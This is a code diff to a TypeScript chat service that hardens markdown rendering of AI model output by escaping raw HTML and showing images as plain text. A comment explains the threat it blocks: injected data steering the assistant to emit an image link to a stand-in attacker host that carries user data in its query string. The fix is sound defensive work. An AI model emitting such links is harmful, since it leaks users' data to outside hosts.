@@ -11,7 +11,7 @@ import {
 } from '@placeos/common';
 import { apiKey, getModule, token } from '@placeos/ts-client';
 
-import * as marked from 'marked';
+import { Marked } from 'marked';
 
 export interface ChatMessage {
     id: string;
@@ -22,6 +22,31 @@ export interface ChatMessage {
     function?: string;
     timestamp: number;
 }
+
+const escapeHtml = (text: string) =>
+    text.replace(
+        /[&<>"']/g,
+        (c) =>
+            ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;' })[c] ||
+            '&#39;',
+    );
+
+/**
+ * Markdown for assistant output. Assistant text can be steered by data the
+ * assistant reads, so images and raw HTML show as text. This stops the
+ * browser loading attacker URLs, such as `![](https://x.example/?data=...)`.
+ */
+const chat_markdown = new Marked({
+    useNewRenderer: true,
+    // Inline tags such as `<code>` stop marked escaping the text after them,
+    // so do not read inline HTML. It shows as escaped text.
+    tokenizer: { tag: () => undefined },
+    renderer: {
+        html: ({ text }) => escapeHtml(text),
+        // marked has already escaped the image text
+        image: ({ text }) => text,
+    },
+});
 
 @Injectable({
     providedIn: 'root',
@@ -179,7 +204,9 @@ export class ChatService extends AsyncHandler {
                 id: `msg-${randomString(6)}`,
                 chat_id: msg.chat_id,
                 message: msg.message,
-                content: marked.parse(msg.message, { async: false }) as any,
+                content: chat_markdown.parse(msg.message, {
+                    async: false,
+                }) as string,
                 user_id: msg.user_id || 'assistant',
                 function: msg.function,
                 timestamp: Date.now(),
@@ -194,7 +221,9 @@ export class ChatService extends AsyncHandler {
                     id: `msg-${randomString(6)}`,
                     chat_id: msg.chat_id,
                     message: msg.message,
-                    content: marked.parse(msg.message, { async: false }) as any,
+                    content: chat_markdown.parse(msg.message, {
+                        async: false,
+                    }) as string,
                     user_id: msg.user_id || 'assistant',
                     timestamp: Date.now(),
                 },
